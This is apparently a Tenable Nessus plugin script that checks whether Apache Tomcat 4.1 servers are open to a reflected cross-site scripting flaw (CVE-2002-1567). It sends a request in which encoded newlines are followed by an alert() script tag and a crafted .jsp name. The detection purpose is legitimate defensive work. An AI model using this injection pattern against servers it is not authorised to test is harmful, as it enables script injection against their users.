#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(47715);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2016/10/05 20:44:34 $");

  script_cve_id("CVE-2002-1567");
  script_bugtraq_id(5542);
  script_osvdb_id(9208);
  script_xref(name:"EDB-ID", value:"21734");

  script_name(english:"Apache Tomcat 4.1 XSS");
  script_summary(english:"Inject XSS with %0A%0A sequence.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a cross-site scripting
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Apache Tomcat running on the remote web server is
affected by a cross-site scripting vulnerability due to a failure to
properly sanitize request strings of malicious JavaScript. A remote,
unauthenticated attacker can exploit this to execute arbitrary code by
using a URL containing encoded newline characters that are followed by
a request to a .jsp file that has a crafted file name.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/vuln-dev/2002/Aug/102");
  script_set_attribute(attribute:"see_also", value:"http://tomcat.apache.org/security-4.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to Apache Tomcat version 4.1.29 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value: "2002/08/21");
  script_set_attribute(attribute:"patch_publication_date", value: "2003/10/27");
  script_set_attribute(attribute:"plugin_publication_date", value: "2010/07/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:tomcat");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("tomcat_error_version.nasl");
  script_require_ports("Services/www", 8080);
  script_require_keys("www/tomcat");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

get_kb_item_or_exit("www/tomcat");

port = get_http_port(default:8080);
get_kb_item_or_exit("www/"+port+"/tomcat");

dir = rand_str(length:10);
xss= "<script>alert("+SCRIPT_NAME - ".nasl" + "-" + unixtime()+");</script>";
url = dir+"%0a%0a"+xss+dir+".jsp";

r = http_send_recv3(
  method   : 'GET',
  item     : '/' + url,
  port     : port,
  fetch404 : TRUE,
  follow_redirect : 2,
  exit_on_fail    : TRUE
);

if (
# Check HTTP headers for 404 response and body for the payload
# which will contain the remainder of the response headers
# http://tomcat.apache.org/security-4.html
  (r[0] =~ "404(.+)?\s+\/"+dir) &&
  (xss+dir+".jsp" >< r[2])
)
{
  set_kb_item(name: 'www/'+port+'/generic_xss', value:TRUE);
  output = extract_pattern_from_resp(pattern: "ST:"+xss, string: r[2]) + '\n';

  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    generic    : TRUE,
    xss        : TRUE,  # XSS KB key
    request    : make_list(build_url(qs:"/"+url, port:port)),
    output     : output
  );
}
else audit(AUDIT_LISTEN_NOT_VULN, "Apache Tomcat", port);
